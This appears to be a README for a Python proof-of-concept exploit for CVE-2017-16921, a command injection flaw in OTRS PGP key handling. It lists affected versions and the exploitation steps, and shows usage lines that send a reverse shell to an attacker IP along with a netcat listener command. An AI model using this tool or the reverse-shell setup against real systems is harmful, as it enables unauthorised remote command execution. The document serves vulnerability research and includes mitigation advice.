This repository contains a proof‑of‑concept exploit for CVE‑2017‑16921, a remote command execution vulnerability affecting multiple versions of OTRS (Open Ticket Request System).

The exploit automates authentication against the OTRS agent panel and abuses a parameter handling flaw in the PGP configuration interface to execute arbitrary commands on the underlying operating system.

The script was developed for research and educational purposes to demonstrate the impact of improper input validation within the affected OTRS versions.

Vulnerability Overview

CVE‑2017‑16921 is a command injection vulnerability present in the PGP key management functionality of OTRS.

Affected versions include:

OTRS 4.0.x up to 4.0.26

OTRS 5.0.x up to 5.0.24

OTRS 6.0.x up to 6.0.1

The vulnerability occurs because user‑controlled input passed through the web interface is improperly sanitized before being used in system calls related to PGP key handling.

An authenticated attacker with agent privileges can manipulate specific form parameters and inject shell commands that are executed by the OTRS backend.

Since OTRS typically runs under the web server user (e.g., www-data, apache, or otrs), the injected commands execute with those permissions.

Exploitation Details

The exploitation process generally follows these steps:

Authenticate to the OTRS Agent Panel.

Retrieve the session cookies and ChallengeToken required for form submission.

Access the PGP configuration endpoint.

Inject malicious input into parameters processed by the backend.

Trigger the vulnerable system call.

Execute arbitrary commands on the target server.

The exploit automates these steps and optionally provides a reverse shell connection back to the attacker.

Features

Automatic authentication to the OTRS agent interface

Automatic retrieval of required ChallengeToken

Command injection via vulnerable PGP configuration parameters

Reverse shell support

Minimal dependencies

Python‑based implementation

Requirements

Python 3.x

requests module

Valid OTRS agent credentials

Network access to the target OTRS instance

Install dependencies if needed:

pip3 install requests

Usage

python3 CVE-2017-16921.py

Example usage:

python3 CVE-2017-16921.py -u http://target/otrs/index.pl \
                         -U agent_user \
                         -P password \
                         -l 10.10.14.5 \
                         -p 4444


                         | Parameter | Description                  |
| --------- | ---------------------------- |
| `-u`      | Target OTRS URL              |
| `-U`      | Agent username               |
| `-P`      | Agent password               |
| `-l`      | Local IP for reverse shell   |
| `-p`      | Local port for reverse shell |

Reverse Shell Listener

Before executing the exploit, start a listener:

nc -lvnp 4444

If the exploit is successful, the target system will connect back to the listener.

Example Attack Flow

Attacker logs into the OTRS agent panel.

The exploit script retrieves the required session tokens.

A malicious payload is injected into a vulnerable PGP form parameter.

The backend executes the injected shell command.

The attacker gains remote command execution.

Impact

Successful exploitation allows an authenticated attacker to:

Execute arbitrary commands

Access sensitive system files

Pivot to other systems within the network

Potentially escalate privileges depending on system configuration

Mitigation

Upgrade OTRS to a patched version where the vulnerability is addressed.

Additional recommendations:

Restrict access to the OTRS agent interface

Apply strict authentication policies

Monitor logs for suspicious agent activity

Implement network segmentation

References

Exploit‑DB:
https://www.exploit-db.com/exploits/43853

CVE Entry:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16921

OTRS Security Advisory

Credits

Hex_26 – ChallengeToken retrieval function

Bæln0rn – Initial exploit research

Repository maintained by SmarttFoxx
